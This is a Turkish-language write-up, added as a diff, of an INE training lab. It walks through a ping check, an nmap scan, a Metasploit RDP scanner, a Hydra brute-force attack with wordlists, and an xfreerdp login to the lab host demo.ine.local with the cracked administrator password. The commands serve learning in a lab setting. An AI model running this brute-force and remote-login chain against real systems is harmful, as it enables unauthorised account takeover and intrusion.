@@ -1,0 +1,73 @@
+# 🎯 INE CTF: RDP Güvenlik Açığı Keşfi ve Sızma Testi
+
+Bu çalışmada INE platformunda sunulan `demo.ine.local` hedef sistemine yönelik bir sızma testi gerçekleştirilmiştir. Amacımız, sistemde çalışan **RDP servisini tespit edip**, brute-force yöntemiyle kullanıcı parolasını ele geçirerek sisteme **uzaktan masaüstü erişimi sağlamaktır.**
+
+---
+
+## 🌐 Hedef Sistem: demo.ine.local
+
+---
+
+## 🔍 1. Ulaşılırlık Kontrolü
+
+İlk olarak hedef sistemin aktif olup olmadığını kontrol ettik:
+ping demo.ine.local
+Sonuç:
+64 bytes from demo.ine.local (10.2.22.12): icmp_seq=1 ttl=125 time=5.51 ms
+64 bytes from demo.ine.local (10.2.22.12): icmp_seq=2 ttl=125 time=3.02 ms
+64 bytes from demo.ine.local (10.2.22.12): icmp_seq=3 ttl=125 time=2.90 ms
+✅ Hedef sistem çevrimiçi.
+
+🔎 2. Servis ve Port Taraması (Nmap)
+Açık portları ve çalışan servisleri öğrenmek için servis versiyonu taraması yaptık:
+nmap -sV demo.ine.local
+Tespit edilen önemli portlar:
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds (Windows Server 2008 R2 - 2012)
+3333/tcp  open  ssl/dec-notes? 🔥
+...
+🔍 3333/tcp portu şüpheli görünüyordu. RDP servisi bu porta taşınmış olabilir.
+
+🕵️ 3. RDP Portunu Tespit Etme (Metasploit)
+RDP servisinin gerçekten 3333 portunda çalışıp çalışmadığını test ettik:
+msfconsole
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS demo.ine.local
+set RPORT 3333
+exploit
+✅ RDP servisi 3333 numaralı portta çalışıyor!
+
+🔓 4. Brute-Force ile Parola Elde Etme (Hydra)
+Kullanıcı adı ve parola listelerini kullanarak brute-force saldırısı gerçekleştirdik:
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
+      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
+      rdp://demo.ine.local -s 3333
+🎯 Geçerli kullanıcı bilgileri başarıyla elde edildi:
+Username: administrator
+Password: qwertyuiop
+💻 5. Uzaktan Masaüstü Erişimi (RDP)
+Kullanıcı bilgileri ile RDP oturumu başlatıldı:
+xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
+🖥️ Başarılı bir şekilde masaüstü ortamına erişim sağlandı.
+
+🧠 Öğrenilenler
+Nmap ile port ve servis keşfi, saldırı öncesi vazgeçilmezdir.
+Varsayılan RDP portunun değiştirilmesi güvenlik için iyi bir pratik gibi görünse de, bu durumda kolayca tespit edilip hedef haline gelmiştir.
+Hydra aracı güçlü bir brute-force aracıdır ancak saldırganın parola listelerinin kalitesiyle sınırlıdır.
+xfreerdp ile doğrudan RDP bağlantısı sağlanabilir.
+
+🛠 Kullanılan Araçlar
+nmap
+msfconsole (Metasploit)
+hydra
+xfreerdp
+
+📁 Kaynaklar
+INE Platformu
+Nmap Resmi Sitesi
+Metasploit Framework
+Hydra aracı
+FreeRDP
+
